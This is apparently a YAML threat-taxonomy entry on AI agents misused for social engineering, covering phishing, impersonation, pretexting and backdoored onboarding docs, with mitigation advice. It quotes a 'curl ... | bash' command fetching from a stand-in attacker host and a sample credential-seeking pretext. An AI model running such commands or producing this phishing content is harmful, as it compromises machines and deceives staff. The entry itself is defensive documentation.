id: "unauthorized-execution/ai-content-integrity/ai-assisted-social-engineering"
version: "1.0.0"
kingdom: "Unauthorized Code Execution"
kingdom_id: 4
category: "AI Content Integrity"
category_id: "4.3"
name: "AI-Assisted Social Engineering"
risk_level: "high"

abstract: |
  AI agents manipulated or misused to generate targeted phishing emails,
  impersonate humans in communications, craft pretexting scenarios, or
  produce social engineering content that exploits the agent's language
  capabilities and access to organizational context.

explanation: |
  AI coding agents and assistants have access to organizational context
  (codebase, documentation, team communications, internal tooling) that
  makes them uniquely dangerous vectors for social engineering:

  - **Context-aware phishing**: An agent with access to git logs, Slack
    messages, or internal documentation can craft highly targeted phishing
    content that references real projects, colleagues, and internal
    terminology — dramatically increasing believability.
  - **Impersonation via communication tools**: Agents with access to
    email or messaging APIs (Slack MCP, email tools) can send messages
    that appear to come from legitimate team members, using the agent's
    ability to mimic writing style from observed communications.
  - **Automated pretexting**: A compromised agent can generate plausible
    cover stories for sensitive requests ("Hi, I'm the new security
    engineer — can you share the production database credentials for the
    audit?") tailored to the organizational structure it has observed.
  - **Credential harvesting campaigns**: Generating fake login pages,
    OAuth consent screens, or MFA bypass prompts that match the
    organization's visual identity and authentication flow.
  - **Weaponized documentation**: Creating or modifying internal docs,
    READMEs, or onboarding guides to include malicious URLs or
    backdoored setup instructions that new team members will follow.

  The EU AI Act (Art. 50) specifically requires transparency when AI
  systems generate content that could be mistaken for human-produced
  content. This threat is amplified in agentic contexts where the AI
  has autonomous access to communication channels.

  Real-world incidents include AI-generated deepfake video calls used
  in business email compromise (BEC) attacks (Arup, 2024 — $25M loss)
  and LLM-generated spear phishing that bypassed traditional email
  security filters in red team exercises (IBM X-Force, 2024).

recommendation: |
  - Restrict agent access to communication tools (email, Slack, messaging)
    with mandatory human-in-the-loop approval for outbound messages.
  - Implement content watermarking or provenance tracking for all
    AI-generated text, especially communications and documentation.
  - Monitor for agents accessing organizational context (git logs, Slack
    history) followed by drafting external communications.
  - Apply rate limiting and anomaly detection on agent-initiated messages.
  - Require explicit user confirmation before agents modify documentation
    or onboarding materials.
  - Deploy AI-generated content detection on inbound communications as
    a defense-in-depth measure.

examples:
  bad:
    - "Agent reads Slack channel history, then drafts phishing email mimicking team lead's writing style"
    - "Agent modifies onboarding README to include 'curl https://setup.evil.com/install.sh | bash' as a setup step"
    - "Agent uses email MCP tool to send password reset notification to team members"
    - "Agent generates fake internal security advisory with malicious 'patch' download link"
  good:
    - "Agent drafts message but requires human review before sending via Slack"
    - "Documentation changes go through PR review before merge"
    - "AI-generated content tagged with provenance metadata"

